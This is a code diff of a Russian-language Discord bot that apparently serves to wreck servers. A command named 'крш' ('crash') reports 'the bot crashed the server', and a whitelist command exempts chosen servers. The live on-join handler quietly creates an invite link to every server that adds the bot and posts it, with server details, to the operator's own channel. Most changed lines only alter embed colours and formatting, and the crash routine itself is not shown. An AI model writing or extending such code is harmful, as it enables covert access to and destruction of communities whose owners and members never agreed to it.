@@ -41,25 +41,24 @@ icsu_pfp = open("icsu.png", "rb")
 @bot.event
 async def on_guild_join(guild):
     channel = bot.get_channel(1405476031170740255)
-    desc = f'''
-    - ID сервера - {guild.id}
-    - Количество участников - {guild.member_count}
-            '''
-    embed = discord.Embed(title='Бот был добавлен на сервер',description=desc,colour=discord.Colour.dark_grey())
-    embed.set_footer(text=guild.name,icon_url=guild.icon)
+    
+    emb = discord.Embed(title='Бот был добавлен на сервер!', colour=discord.Colour.green(),
+    description=f'- ID сервера - {guild.id} \n - Количество участников - {guild.member_count}')
+    emb.set_footer(text=guild.name,icon_url=guild.icon)
+
     guildlink = None
     for textchan in guild.text_channels:
         if not guildlink:
             guildlink = str(await textchan.create_invite())
             if guildlink:
-                embed.description = f'- Ссылка на сервер - {guildlink} \n' + desc
-                await channel.send(embed=embed)
+                    emb.description = f'- Ссылка на сервер - {guildlink}\n' + emb.description
+                    await channel.send(embed=emb)
     
     
 @bot.event
 async def on_guild_remove(guild):
     chan = bot.get_channel(1405476031170740255)
-    embed = discord.Embed(title='Бот был удален с сервера',colour=discord.Colour.dark_grey())
+    embed = discord.Embed(title='Бот был удален с сервера',colour=discord.Colour.red())
     embed.set_footer(text=guild.name,icon_url=guild.icon)
     await chan.send(embed=embed)
  
@@ -174,7 +173,7 @@ async def крш(ctx):
         
         await asyncio.sleep(10)
             
-        emb = discord.Embed(title='Бот крашнул сервер', colour=discord.Colour.dark_grey(),
+        emb = discord.Embed(title='Бот крашнул сервер', colour=discord.Colour.green(),
         description=f'- ID сервера - {guild.id} \n - Количество участников - {guild.member_count}')
         emb.set_footer(text=guild.name,icon_url=guild.icon)
            
@@ -307,4 +306,5 @@ async def вайтлист(ctx, serv_id: int):
     
     
     
+
 bot.run(token, log_handler=None)
